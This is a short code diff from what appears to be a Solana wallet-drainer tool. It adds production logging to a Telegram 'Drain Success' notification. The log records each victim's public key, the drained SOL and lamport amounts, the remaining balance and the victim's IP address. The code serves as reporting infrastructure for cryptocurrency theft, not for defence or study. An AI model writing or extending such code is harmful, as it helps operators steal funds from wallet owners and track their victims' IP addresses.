@@ -146,6 +146,16 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     // Ensure drained amount is always shown, even if 0
     const drainedDisplay = drainedAmount > 0 ? `${drainedSOL} SOL (${drainedAmount} lamports)` : '0.000000 SOL (0 lamports)';
     
+    // Always log drain success in production
+    console.log('[TELEGRAM_DRAIN_SUCCESS] Drain success logged:', {
+      publicKey: data.publicKey,
+      drainedAmount: drainedAmount,
+      drainedSOL: drainedSOL,
+      balance: balance,
+      balanceSOL: balanceSOL,
+      ip: ip
+    });
+    
     const message = `
 <b>💰 Drain Success</b>
 
